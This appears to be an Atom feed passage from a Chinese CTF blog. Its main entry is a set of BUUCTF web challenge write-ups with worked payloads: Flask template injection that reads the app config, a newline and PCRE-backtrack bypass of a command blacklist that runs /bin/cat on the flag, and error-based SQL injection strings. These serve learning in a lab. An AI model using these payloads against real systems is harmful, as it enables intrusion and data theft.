class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><br>发现是一个ssti模板注入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[&#39;FLAG&#39;] &#x3D; os.environ.pop(&#39;FLAG&#39;)</span><br></pre></td></tr></table></figure><br>上面这段代码所有flag在config里面，但是有过滤:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s &#x3D; s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)</span><br><span class="line">   blacklist &#x3D; [&#39;config&#39;, &#39;self&#39;]</span><br><span class="line">   return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;&#x3D;None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s</span><br></pre></td></tr></table></figure><br>这个代码把传入的config全部置为None。所以我们不能直接输入<br>接着寻找别的解法：<br>找到两种payload：</p><p>python还有一些内置函数，比如url_for和get_flashed_messages<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;</span><br></pre></td></tr></table></figure><br>将这个payload拆分：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__</span><br></pre></td></tr></table></figure><br>这个是查看当前的所有全局变量<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/53.png" class="" title="Da4er"><br>发现有个current.app应该是当前的app，所以构造了如上的payload。</p><p>第二个是get_flashed_messages</p><blockquote><p>返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;</span><br></pre></td></tr></table></figure><br>随便输入一个payload得到flag:<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/54.png" class="" title="Da4er"></p></blockquote><hr><h3 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h3><p>知识点：Unicode编码问题<br>参考博客：<a href="https://xz.aliyun.com/t/5402#toc-0">https://xz.aliyun.com/t/5402#toc-0</a><br>这道题主要利用的是Unicode处理数字的时候，存在显示问题。不同国家的数字经过unicode编码后的结果可能和数字表示的原意不同：<br><strong>例如孟加拉语的0-9是০ ১ ২ ৩ ৪ ৫ ৬ ৭ ৮ ৯，但是这里的৪ (U+09EA) 实际上是数字4。</strong><br>解题：打开题目，查看源码，发现题目是utf-8编码。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/59.png" class="" title="Da4er"><br>在测试后发现，当我们买了第四个商品时，就会出现flag。但是限制了第二个输入框只能输入一个字符：<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/60.png" class="" title="Da4er"><br>但是题目是经过utf-8编码的，所以我们可以使用unicode编码问题：<br>在这个网址上寻找别的unicode编码：<a href="https://www.compart.com/en/unicode">https://www.compart.com/en/unicode</a><br><strong>注意在这个网址上搜索时，要填入英文。</strong><br>我们找到一个字符：<img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/61.png" class="" title="Da4er"><br>utf-8编码为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xF0 0x90 0x84 0xA3</span><br></pre></td></tr></table></figure><p>将0x改成%，提交即可得到flag。</p><hr><h3 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h3><p>知识点：git源码泄露+源码恢复；二次注入</p><p><a href="https://blog.csdn.net/weixin_43940853/article/details/105121265">https://blog.csdn.net/weixin_43940853/article/details/105121265</a></p><p><a href="https://www.cnblogs.com/Tkitn/p/11648456.html">https://www.cnblogs.com/Tkitn/p/11648456.html</a></p><hr><h3 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h3><p>上传.htaccess 比赛的时候是可以上传shtml，发送成功解析，但是在BUU上就不行了。</p><hr><h3 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h3><p>两种解法<br>知识点：<br>一.<br>preg_match匹配问题：只能匹配第一行，我们可以通过%0a换行。<br>二.<br>PCRE正则回溯绕过限制，原理：PHP中的正则库PCRE是基于NFA。<br><strong>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</strong><br>这就造成了回溯绕过限制，因为PHP回溯次数就是有限制的：<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/66.png" class="" title="Da4er"><br>以英文为准，上限次数为1000000.<br>当超过上限次数的时候，正则匹配会返回false，从而绕过过滤<br>参考博客：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a><br>做题:<br>一。<br>更改环境变量，使用绝对路径的cat命令。<br>打开题目说要输入json格式化的字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</span><br></pre></td></tr></table></figure><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/62.png" class="" title="Da4er"><p>当我们尝试cat /flag的时候发现被拦截。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/63.png" class="" title="Da4er"><br>尝试了多种方法，都没有绕过。只能上网找wp2333.。。<br>发现网上都是拿源码来说的，贴上源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">'PATH=/home/rceservice/jail'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Attempting to run command:&lt;br/&gt;'</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="keyword">true</span>)[<span class="string">'cmd'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="keyword">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'Invalid input'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现过滤很多字符，怨不得绕不过去2333<br>但是发现这个过滤代码是通过preg_match匹配过滤的，preg_match只能匹配第一行。所以我们可以通过%0a绕过。<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%0a&quot;cmd&quot;:&quot;ls &#x2F;home&#x2F;rceservice&#x2F;&quot;%0a&#125;</span><br></pre></td></tr></table></figure><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/64.png" class="" title="Da4er"><br>但是尝试直接catflag的时候没有显示，继续看源码发现题目改变了环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">putenv(&#39;PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jail&#39;)</span><br></pre></td></tr></table></figure><p>所以我们不能直接使用cat，必须通过绝对路径，最后的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%0a&quot;cmd&quot;:&quot;&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag&quot;%0a&#125;</span><br></pre></td></tr></table></figure><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/65.png" class="" title="Da4er"></p><p>二。<br>正则回溯绕过，附上脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload = <span class="string">'&#123;"cmd":"/bin/cat /home/rceservice/flag","da4er":"'</span>+<span class="string">"a"</span>*(<span class="number">1000000</span>)+<span class="string">'"&#125;'</span></span><br><span class="line">url = <span class="string">"http://0145917c-81ab-4294-9b06-cbe502323d99.node3.buuoj.cn/?cmd=&#123;&#125;"</span>.format(payload)</span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure><br>但是题目是get请求所以打不过去很大的数据包，这个解法没有复现成功。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/67.png" class="" title="Da4er"></p><hr><h3 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h3><p>知识点：报错注入，extractvalue报错最多只能出来30个字符。<br>通过left和right函数截断报错。<br>做题：<br>直接上payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;dmin%27or(extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1)))))%23&amp;password&#x3D;admin111</span><br><span class="line">username&#x3D;dmin%27or(extractvalue(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1)))))%23&amp;password&#x3D;admin111</span><br></pre></td></tr></table></figure><br>通过right和left来截断报错。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/68.png" class="" title="Da4er"></p></script></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;/p&gt;
&lt;h3 id=&quot;RoarCTF-2019-Easy-Calc&quot;&gt;&lt;a href=&quot;#RoarCTF-2019-Easy-Calc&quot; class=&quot;headerlink&quot; title=&quot;[RoarCTF 2019]Easy Calc&quot;&gt;&lt;/a&gt;[RoarCTF 2019]Easy Calc&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;知识点：PHP字符串的解析漏洞。&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&amp;gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替，如下图：&lt;br&gt;&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>关于我</title>
    <link href="https://da4er.top/%E5%85%B3%E4%BA%8E%E6%88%91.html"/>
    <id>https://da4er.top/%E5%85%B3%E4%BA%8E%E6%88%91.html</id>
    <published>2020-03-02T08:29:56.000Z</published>
    <updated>2020-04-08T07:55:45.360Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><img src="/%E5%85%B3%E4%BA%8E%E6%88%91/1.jpg" class><br>努力赶上大佬的安全小白；<br>励志做一个安全研究员的大学生；<br>三流CTFer。</p><hr><p>2020年计划：<br>开发一个MVC架构的项目；<br>努力提高自己的代码审计能力;<br>用Python写一个Scrapy的分布式爬虫；<br>用Python写一个Blog;<br>努力刷题，让自己在CTF小有成就。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;img src=&quot;/%E5%85%B3%E4%BA%8E%E6%88%91/1.jpg&quot; class&gt;&lt;br&gt;努力赶上大佬的安全小白；&lt;br&gt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>2020_2月总结</title>
    <link href="https://da4er.top/2020-2%E6%9C%88%E6%80%BB%E7%BB%93.html"/>
    <id>https://da4er.top/2020-2%E6%9C%88%E6%80%BB%E7%BB%93.html</id>
    <published>2020-03-02T03:10:39.000Z</published>
    <updated>2020-03-02T03:41:18.847Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="74aa9c474218ccb693706d1f274390a66028c792491e7b50ebcaa87c85587038">5b5a3e44a7afb6280dbf2374db4000a75f207f5ab9f6534d0f1ecba2a15fd4c5889909ab3d8d5dda74a909e2f7d1dd7f39e3a999cac91df2fdfee5f4bb7998e45d0ea263e40ca1297aa6acd89bfdf9f330bed965ec1708a58659da4cd6b48d0c26607f6ba7c06e65cb742bf637ee4696352116ea8f480780e3bcccd2bf48198b604d9293d44b74c665cfdd46d736e2aa16665a8ca733cfe0f7a300ab8e1382be3c94f3d2de850bc096721faa49b4e748f884c9c718fd62c9d70f8d22d03e01cfa0221772001bada8966d5c23f0d0a58c781a572a136f459b6f8a156f6a05f5d183b6b4c45c50068706658683c390d523cb5159d11f458d15c9cf8e6a4c5419a1895fa17afed63455e3a9dfb44a5c1ef17615e57ded75399783ab0a1208ff5c0aef6cf79a4bda27dc2a86b2cba61bee46f2777d93e7b10fa5cf0fb8f24d2207839959ae54833bfe95bfc13a41ec5e9cd9fca9df344125fe80c42553881de414fbbc7d2aa134fd4505bed384600fae2e31a6f021efca0a2dfe816f85b948224620eeed111a00cf3350186249d0eaee5568b87c828708ee594813270907eb57b6fe2c08f5a5a3cb784da48cba5259dd20a9090b43dee064fa1dd0703700b378cbd2a8a3af4f8f9b2e231c4976135d7931b6fefb3d3ea9e66908203e1a5ad9fadc52f33d1752942447aeb6f950bd802261c457718d9640e2674d2aea0cc0a0b458843e7a04c456d52bdcb94b87676b5c47709de984dfbc17c226aff7e57b9e1643fde06f9e3b2832a4699e4d89d155b9dd69ce08266205094662b3c2706e5c1d95863851605115c5ba2f3782ff2f40865726f5fd859fd2cf3b6ae5a55efa4c57ef928fe0b8c58a0f65a04c0dce95edcc24e58bf9284da80ff1528a6706f17b904972f632946dac26fefb5f65eac0911ff60676f2d0c47347daf8009fe2e8d18a28e85151f0a4dafba7461ddc19c38a4666cc5ece40abdb48a58eaf1d2d0cf26233581bb014b1046f6bf23c9def456b80ba61401c882cbb88ee7e8be59f325c9186fdd095d6fb395e1c97395f5bb20ed51c16cdf15ea396f3308018a6f2411942695590cd6dedf8bf3f369cde797d437f08a0ee56c5d9fe339f22f2b64f376ea83f5714af777b90d768132e5be3c9d9026257f33435f6cce36edcdd37c7804febef0a80e0ae9260723f1d52d48b1d3f96a827702d886762a8eb639a265bf8b36b047db2169fe77cbf5b27e82d11785d3436cb6e400c3325a594f3609782ff39a174ffd438b909404fc71830a2926661ae81dd0c1df4425c371357d7cbd91a4b3f43e25da8e3838ab710e9cf674369aa1a5a9388e8e5c005c4fa1819120bdd84684dab352cc54ea0ed0af7d149f8b7160528e165e9a52fb6c2a86eae9080d3119408f249bfca7708b9daf936f0a9e4914519deff3803c770a1cabc0f3e17089c15c30033f546c96fc1964b287a91122fcd69a14e0efee79fffc61729d781c6f5627cbec1c7b1eeb252f7a1dc189be76c71402cb567d53701d8c3148ed7102188185dbeb4f4e88e4318861a955b69dd1657da3f8d59177418978090752205507ea2034312dc62b3c1068387d7b48badcd573354b922c713f8e88caf826d01be003499e5c5dca037e50da48ccb9f32a9d296be86443aa55ed97b144ecfb88f4e0bcbed7234ff80375557026fb11f0721f594202d33a5a59b59f1bc3919071ee8f5980d813cd5e4df325852ae7729de8b92462856acaa73b8986c9c12f381efb7faa368eebff0bd91326459c81b132cd063a4103e8c72444aed643145b0a3da11d9264f292b99e8a29641125b45420f5c1cf6bc4e93e4d5cd2a5a4e249607d51d036369d8840763765fc0dc9e13ab969ead547f31f351fc2899574dddc17b685dc186e0f0b6a83bbfeaf30a8c71ed91b279411f16f0e5f8efb044e160adc995c59f1fb3430b2ebeff9756748cf4e6f39befdf6c1352854397b6138a2fd146038973dedc8b368a33a06d94717dd884e6562a2b6d92d64d4507b8f792748367fd8fd44e00e9b243f8aecadf251edb4088ac17d94b6e</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="随笔" scheme="https://da4er.top/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
</feed>
